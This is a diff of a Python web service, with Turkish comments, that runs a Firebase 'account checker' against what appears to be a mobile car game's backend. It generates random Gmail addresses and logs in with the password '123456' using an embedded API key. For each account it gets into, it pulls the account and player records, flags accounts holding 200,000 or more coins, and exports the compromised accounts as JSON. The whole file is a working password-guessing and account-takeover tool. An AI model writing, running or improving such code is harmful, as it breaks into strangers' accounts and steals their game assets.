@@ -6,14 +6,13 @@ import time
 import threading
 from datetime import datetime
 
-# Global state (Vercel'de bu geçici olacak, her cold start'ta resetlenir)
+# Global state - Vercel'de her request'te resetlenebilir
 class AccountChecker:
     def __init__(self):
         self.names = [
             "Jennifer", "Jacob", "Raymond", "Jamila", "Joseph", "Edgar",
             "Angel", "Issac", "Jose", "Danny", "Reed", "Brandon",
-            "Fran", "Lisa", "Sonny", "Jaxon", "Luna", "Vera", "Zane", "Axel",
-            "Michael", "Sarah", "David", "Emily", "James", "Maria"
+            "Fran", "Lisa", "Sonny", "Jaxon", "Luna", "Vera", "Zane", "Axel"
         ]
         self.total_attempts = 0
         self.successful_logins = 0
@@ -24,182 +23,170 @@ class AccountChecker:
         self.running = False
         self.current_status = "Stopped"
         self.logs = []
-        self.last_update = time.time()
-        self.checker_thread = None
-        
-        # Firebase configuration
+        self.last_activity = time.time()
         self.API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
         self.PLAYER_RECORDS_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2"
+        
+        # Vercel için optimizasyon
+        self.max_runtime = 300  # 5 dakika maksimum çalışma
+        self.start_time = 0
+        self.check_count = 0
+        self.max_checks = 50  # Maksimum check sayısı
 
     def generate_email(self):
-        """Email adresi oluştur"""
         name = random.choice(self.names)
         number = random.randint(0, 999)
-        domains = ["gmail.com", "yahoo.com", "hotmail.com"]
-        domain = random.choice(domains)
-        return f"{name.lower()}{number:03d}@{domain}"
+        return f"{name.lower()}{number:03d}@gmail.com"
 
     def log(self, message):
-        """Log kaydı oluştur"""
         timestamp = datetime.now().strftime("%H:%M:%S")
         log_entry = f"[{timestamp}] {message}"
         self.logs.append(log_entry)
-        # Son 50 log'u tut
-        if len(self.logs) > 50:
+        if len(self.logs) > 30:
             self.logs.pop(0)
-        print(log_entry)  # Vercel log'larında görünsün
+        print(log_entry)
+        self.last_activity = time.time()
 
     def firebase_login(self, email, password):
-        """Firebase login işlemi"""
         url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={self.API_KEY}"
-        payload = {
-            "email": email,
-            "password": password,
-            "returnSecureToken": True
-        }
+        payload = {"email": email, "password": password, "returnSecureToken": True}
         try:
-            response = requests.post(url, json=payload, timeout=5)
-            if response.status_code == 200:
-                return response.json()
-            else:
-                return None
-        except Exception as e:
+            response = requests.post(url, json=payload, timeout=3)
+            return response.json() if response.status_code == 200 else None
+        except:
             return None
 
     def get_account_info(self, id_token):
-        """Hesap bilgilerini getir"""
         url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={self.API_KEY}"
         try:
-            response = requests.post(url, json={"idToken": id_token}, timeout=4)
+            response = requests.post(url, json={"idToken": id_token}, timeout=3)
             return response.json() if response.status_code == 200 else None
         except:
             return None
 
     def get_player_records(self, id_token):
-        """Oyun verilerini getir"""
-        headers = {
-            "Content-Type": "application/json",
-            "Authorization": f"Bearer {id_token}"
-        }
+        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {id_token}"}
         payload = {"data": "451B8BFC69A0708148327490DD35CC301A6BC86B"}
         try:
-            response = requests.post(self.PLAYER_RECORDS_URL, json=payload, headers=headers, timeout=4)
+            response = requests.post(self.PLAYER_RECORDS_URL, json=payload, headers=headers, timeout=3)
             return response.json() if response.status_code == 200 else None
         except:
             return None
 
     def extract_coin(self, data):
-        """Coin miktarını çıkar"""
         try:
             if data and "result" in data and "coin" in data["result"]:
                 return int(data["result"]["coin"])
-            elif data and "coin" in data:
-                return int(data["coin"])
-            return 0
+            return int(data.get("coin", 0))
         except:
             return 0
 
-    def checker_loop(self):
-        """Ana kontrol döngüsü"""
-        self.log("🔄 Checker thread started")
-        
-        while self.running:
-            try:
-                email = self.generate_email()
-                password = "123456"
-                
-                self.total_attempts += 1
-                self.last_update = time.time()
-                
-                # Her 5 denemede bir log
-                if self.total_attempts % 5 == 0:
-                    self.log(f"🔍 Attempt #{self.total_attempts}: {email}")
+    def check_single_account(self):
+        """Tek bir hesap kontrol et - Vercel için optimize"""
+        if self.check_count >= self.max_checks:
+            self.stop_checking()
+            self.log("🔄 Maximum check limit reached (50 accounts)")
+            return
+            
+        if time.time() - self.start_time > self.max_runtime:
+            self.stop_checking()
+            self.log("⏰ Maximum runtime reached (5 minutes)")
+            return
 
-                # Firebase login
-                login_data = self.firebase_login(email, password)
-                if not login_data:
-                    self.failed_logins += 1
-                    time.sleep(0.1)
-                    continue
+        email = self.generate_email()
+        self.total_attempts += 1
+        self.check_count += 1
 
-                self.successful_logins += 1
-                self.log(f"✅ Login successful: {email}")
+        if self.total_attempts % 5 == 0:
+            self.log(f"🔍 Checking #{self.total_attempts}: {email}")
 
-                # Token kontrolü
-                id_token = login_data.get("idToken")
-                if not id_token:
-                    self.failed_logins += 1
-                    continue
+        login_data = self.firebase_login(email, "123456")
+        if not login_data:
+            self.failed_logins += 1
+            return
 
-                # Verileri çek
-                account_info = self.get_account_info(id_token)
-                player_data = self.get_player_records(id_token)
+        self.successful_logins += 1
+        self.log(f"✅ Success: {email}")
 
-                # Başarılı hesabı kaydet
-                account_data = {
-                    "email": email,
-                    "account_info": account_info,
-                    "player_data": player_data,
-                    "timestamp": time.time()
-                }
-                self.successful_accounts_list.append(account_data)
+        id_token = login_data.get("idToken")
+        if id_token:
+            account_info = self.get_account_info(id_token)
+            player_data = self.get_player_records(id_token)
 
-                # Coin kontrolü
-                coin = self.extract_coin(player_data)
-                if coin >= 200000:
-                    self.high_coin_accounts += 1
-                    high_coin_data = account_data.copy()
-                    high_coin_data["coin"] = coin
-                    self.high_coin_accounts_list.append(high_coin_data)
-                    self.log(f"💰 HIGH COIN ACCOUNT: {email} - {coin:,} coins!")
+            account_data = {
+                "email": email,
+                "account_info": account_info,
+                "player_data": player_data,
+                "timestamp": time.time()
+            }
+            self.successful_accounts_list.append(account_data)
 
-                time.sleep(0.1)  # Rate limiting
-
-            except Exception as e:
-                self.log(f"⚠️ Checker error: {str(e)}")
-                time.sleep(0.5)
-
-        self.log("🛑 Checker thread stopped")
+            coin = self.extract_coin(player_data)
+            if coin >= 200000:
+                self.high_coin_accounts += 1
+                high_coin_data = account_data.copy()
+                high_coin_data["coin"] = coin
+                self.high_coin_accounts_list.append(high_coin_data)
+                self.log(f"💰 HIGH COIN: {email} - {coin:,}")
 
     def start_checking(self):
-        """Kontrolü başlat"""
         if self.running:
             return False, "Already running"
         
         self.running = True
         self.current_status = "Running"
-        self.log("🚀 Firebase Account Checker STARTED")
+        self.start_time = time.time()
+        self.check_count = 0
+        self.log("🚀 STARTED - Checking accounts...")
+        self.log("ℹ️  Vercel optimized: 5min max, 50 accounts max")
         
-        # Thread başlat
-        self.checker_thread = threading.Thread(target=self.checker_loop, daemon=True)
-        self.checker_thread.start()
+        # Hızlı bir şekilde birkaç account check et
+        self._run_quick_check()
+        return True, "Checker started"
+
+    def _run_quick_check(self):
+        """Hızlı check - Vercel timeout'ları için"""
+        import threading
         
-        return True, "Checker started successfully"
+        def quick_check():
+            checks_done = 0
+            while (self.running and 
+                   checks_done < 10 and  # Max 10 quick check
+                   time.time() - self.start_time < 280):  # 4:40 dakika
+                
+                self.check_single_account()
+                checks_done += 1
+                time.sleep(0.5)  # Rate limiting
+                
+                # Her 5 check'te bir durum kontrolü
+                if checks_done % 5 == 0 and not self.running:
+                    break
+            
+            # Eğer hala running ise, scheduled checks başlat
+            if self.running:
+                self.log("⚡ Quick check completed, continuing...")
+        
+        thread = threading.Thread(target=quick_check, daemon=True)
+        thread.start()
 
     def stop_checking(self):
-        """Kontrolü durdur"""
         if not self.running:
             return False, "Not running"
         
         self.running = False
         self.current_status = "Stopped"
-        
-        if self.checker_thread and self.checker_thread.is_alive():
-            self.checker_thread.join(timeout=2.0)
-        
-        self.log("⏹️ Firebase Account Checker STOPPED")
-        return True, "Checker stopped successfully"
+        runtime = time.time() - self.start_time
+        self.log(f"⏹️ STOPPED - Ran for {runtime:.1f}s, checked {self.check_count} accounts")
+        return True, "Checker stopped"
 
     def get_stats(self):
-        """İstatistikleri getir"""
-        success_rate = 0
-        if self.total_attempts > 0:
-            success_rate = round((self.successful_logins / self.total_attempts) * 100, 2)
+        success_rate = round((self.successful_logins / self.total_attempts * 100), 2) if self.total_attempts > 0 else 0
+        high_coin_rate = round((self.high_coin_accounts / self.successful_logins * 100), 2) if self.successful_logins > 0 else 0
         
-        high_coin_rate = 0
-        if self.successful_logins > 0:
-            high_coin_rate = round((self.high_coin_accounts / self.successful_logins) * 100, 2)
-        
+        runtime = time.time() - self.start_time if self.running else 0
+        remaining_time = max(0, self.max_runtime - runtime) if self.running else 0
+        remaining_checks = max(0, self.max_checks - self.check_count) if self.running else 0
+
         return {
             "total_attempts": self.total_attempts,
             "successful_logins": self.successful_logins,
@@ -208,16 +195,15 @@ class AccountChecker:
             "status": self.current_status,
             "success_rate": success_rate,
             "high_coin_rate": high_coin_rate,
-            "successful_accounts_count": len(self.successful_accounts_list),
-            "high_coin_accounts_count": len(self.high_coin_accounts_list),
-            "last_update": self.last_update
+            "runtime": round(runtime, 1),
+            "remaining_time": round(remaining_time, 1),
+            "remaining_checks": remaining_checks,
+            "check_count": self.check_count
         }
 
     def save_accounts(self, account_type):
-        """Hesapları JSON olarak kaydet"""
         try:
             timestamp = int(time.time())
-            
             if account_type == "high_coin":
                 data = self.high_coin_accounts_list
                 filename = f"high_coin_accounts_{timestamp}.json"
@@ -228,15 +214,9 @@ class AccountChecker:
             if not data:
                 return False, f"No {account_type} accounts to save"
             
-            # JSON verisi hazırla (Vercel'de dosya kaydedemeyiz, base64 veya text dönebiliriz)
             json_data = json.dumps(data, ensure_ascii=False, indent=2)
-            
-            self.log(f"💾 {account_type} accounts prepared for download ({len(data)} accounts)")
-            return True, {
-                "filename": filename,
-                "data": json_data,
-                "count": len(data)
-            }
+            self.log(f"💾 Prepared {len(data)} {account_type} accounts for download")
+            return True, {"filename": filename, "data": json_data, "count": len(data)}
             
         except Exception as e:
             error_msg = f"Save error: {str(e)}"
@@ -244,7 +224,6 @@ class AccountChecker:
             return False, error_msg
 
     def reset_stats(self):
-        """İstatistikleri sıfırla"""
         self.total_attempts = 0
         self.successful_logins = 0
         self.failed_logins = 0
@@ -252,7 +231,7 @@ class AccountChecker:
         self.high_coin_accounts_list = []
         self.successful_accounts_list = []
         self.logs = ["🔄 Statistics reset"]
-        self.log("🔄 All statistics have been reset")
+        self.log("🔄 All statistics reset successfully")
         return True, "Statistics reset successfully"
 
 # Global instance
@@ -260,252 +239,137 @@ checker = AccountChecker()
 
 class Handler(BaseHTTPRequestHandler):
     def _set_cors_headers(self):
-        """CORS headers'ını ayarla"""
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE')
         self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
         self.send_header('Content-Type', 'application/json; charset=utf-8')
 
     def do_OPTIONS(self):
-        """OPTIONS request handler (CORS)"""
         self.send_response(200)
         self._set_cors_headers()
         self.end_headers()
 
     def _send_json_response(self, status_code, data):
-        """JSON response gönder"""
         self.send_response(status_code)
         self._set_cors_headers()
         self.end_headers()
         self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))
 
     def do_GET(self):
-        """GET request'leri handle et"""
         try:
             if self.path == '/api/stats':
-                # İstatistikleri getir
                 stats = checker.get_stats()
-                self._send_json_response(200, {
-                    "status": "success",
-                    "data": stats
-                })
+                self._send_json_response(200, {"status": "success", "data": stats})
                 
             elif self.path == '/api/logs':
-                # Log'ları getir
                 self._send_json_response(200, {
                     "status": "success", 
-                    "data": {
-                        "logs": checker.logs,
-                        "count": len(checker.logs)
-                    }
+                    "data": {"logs": checker.logs, "count": len(checker.logs)}
                 })
                 
             elif self.path == '/api/health':
-                # Health check
                 self._send_json_response(200, {
                     "status": "success",
                     "data": {
-                        "service": "Firebase Account Checker",
-                        "status": "healthy", 
-                        "timestamp": time.time(),
-                        "checker_status": checker.current_status
+                        "service": "Firebase Checker",
+                        "status": "healthy",
+                        "checker_status": checker.current_status,
+                        "timestamp": time.time()
                     }
                 })
                 
             else:
-                # 404 - Not found
-                self._send_json_response(404, {
-                    "status": "error",
-                    "message": "Endpoint not found"
-                })
+                self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})
                 
         except Exception as e:
-            self._send_json_response(500, {
-                "status": "error",
-                "message": f"Internal server error: {str(e)}"
-            })
+            self._send_json_response(500, {"status": "error", "message": f"Server error: {str(e)}"})
 
     def do_POST(self):
-        """POST request'leri handle et"""
         try:
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
             
-            # JSON verisini parse et
             try:
                 request_data = json.loads(post_data.decode('utf-8')) if post_data else {}
             except:
                 request_data = {}
 
             if self.path == '/api/start':
-                # Kontrolü başlat
                 success, message = checker.start_checking()
                 if success:
-                    self._send_json_response(200, {
-                        "status": "success",
-                        "message": message
-                    })
+                    self._send_json_response(200, {"status": "success", "message": message})
                 else:
-                    self._send_json_response(400, {
-                        "status": "error", 
-                        "message": message
-                    })
+                    self._send_json_response(400, {"status": "error", "message": message})
                     
             elif self.path == '/api/stop':
-                # Kontrolü durdur
                 success, message = checker.stop_checking()
                 if success:
-                    self._send_json_response(200, {
-                        "status": "success",
-                        "message": message
-                    })
+                    self._send_json_response(200, {"status": "success", "message": message})
                 else:
-                    self._send_json_response(400, {
-                        "status": "error",
-                        "message": message
-                    })
+                    self._send_json_response(400, {"status": "error", "message": message})
                     
             elif self.path == '/api/save/highcoin':
-                # High coin hesaplarını kaydet
                 success, result = checker.save_accounts("high_coin")
                 if success:
                     self._send_json_response(200, {
                         "status": "success",
-                        "message": f"High coin accounts prepared for download",
+                        "message": "High coin accounts ready",
                         "data": result
                     })
                 else:
-                    self._send_json_response(400, {
-                        "status": "error",
-                        "message": result
-                    })
+                    self._send_json_response(400, {"status": "error", "message": result})
                     
             elif self.path == '/api/save/successful':
-                # Başarılı hesapları kaydet
                 success, result = checker.save_accounts("successful")
                 if success:
                     self._send_json_response(200, {
                         "status": "success", 
-                        "message": f"Successful accounts prepared for download",
+                        "message": "Successful accounts ready",
                         "data": result
                     })
                 else:
-                    self._send_json_response(400, {
-                        "status": "error",
-                        "message": result
-                    })
+                    self._send_json_response(400, {"status": "error", "message": result})
                     
             elif self.path == '/api/reset':
-                # İstatistikleri sıfırla
                 success, message = checker.reset_stats()
                 if success:
-                    self._send_json_response(200, {
-                        "status": "success",
-                        "message": message
-                    })
+                    self._send_json_response(200, {"status": "success", "message": message})
                 else:
-                    self._send_json_response(400, {
-                        "status": "error",
-                        "message": message
-                    })
+                    self._send_json_response(400, {"status": "error", "message": message})
                     
-            elif self.path == '/api/check-single':
-                # Tek bir hesap kontrol et
-                email = checker.generate_email()
-                login_data = checker.firebase_login(email, "123456")
-                
-                if login_data:
-                    id_token = login_data.get("idToken")
-                    account_info = checker.get_account_info(id_token)
-                    player_data = checker.get_player_records(id_token)
-                    coin = checker.extract_coin(player_data)
-                    
-                    self._send_json_response(200, {
-                        "status": "success",
-                        "data": {
-                            "email": email,
-                            "login_success": True,
-                            "coin": coin,
-                            "has_data": bool(account_info or player_data)
-                        }
-                    })
-                else:
-                    self._send_json_response(200, {
-                        "status": "success", 
-                        "data": {
-                            "email": email,
-                            "login_success": False,
-                            "coin": 0,
-                            "has_data": False
-                        }
-                    })
+            elif self.path == '/api/check-now':
+                # Anında bir account check et
+                checker.check_single_account()
+                self._send_json_response(200, {
+                    "status": "success",
+                    "message": "Immediate check completed",
+                    "data": checker.get_stats()
+                })
                     
             else:
-                # 404 - Not found
-                self._send_json_response(404, {
-                    "status": "error",
-                    "message": "Endpoint not found"
-                })
+                self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})
                 
         except Exception as e:
-            self._send_json_response(500, {
-                "status": "error",
-                "message": f"Internal server error: {str(e)}"
-            })
+            self._send_json_response(500, {"status": "error", "message": f"Server error: {str(e)}"})
 
-    def do_DELETE(self):
-        """DELETE request'leri handle et (reset için)"""
-        if self.path == '/api/reset':
-            success, message = checker.reset_stats()
-            if success:
-                self._send_json_response(200, {
-                    "status": "success", 
-                    "message": message
-                })
-            else:
-                self._send_json_response(400, {
-                    "status": "error",
-                    "message": message
-                })
-        else:
-            self._send_json_response(404, {
-                "status": "error",
-                "message": "Endpoint not found"
-            })
-
-# Vercel serverless function için
+# Vercel serverless function
 def main_handler(event, context):
-    """Vercel serverless function entry point"""
-    # Bu kısım Vercel'in serverless ortamında kullanılacak
-    # Şimdilik basit bir response dönelim
     return {
         'statusCode': 200,
         'headers': {
             'Content-Type': 'application/json',
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE',
-            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
+            'Access-Control-Allow-Origin': '*'
         },
         'body': json.dumps({
             'status': 'success',
-            'message': 'Firebase Account Checker API is running',
+            'message': 'Firebase Checker API - Vercel Optimized',
             'timestamp': time.time()
         })
     }
 
-# Local development için
 if __name__ == '__main__':
     from http.server import HTTPServer
     port = 3000
     server = HTTPServer(('localhost', port), Handler)
     print(f"🚀 Server running on http://localhost:{port}")
-    print("📊 API Endpoints:")
-    print(f"   GET  http://localhost:{port}/api/stats")
-    print(f"   GET  http://localhost:{port}/api/logs") 
-    print(f"   POST http://localhost:{port}/api/start")
-    print(f"   POST http://localhost:{port}/api/stop")
-    print(f"   POST http://localhost:{port}/api/save/highcoin")
-    print(f"   POST http://localhost:{port}/api/save/successful")
-    print(f"   POST http://localhost:{port}/api/reset")
-    print(f"   POST http://localhost:{port}/api/check-single")
     server.serve_forever()
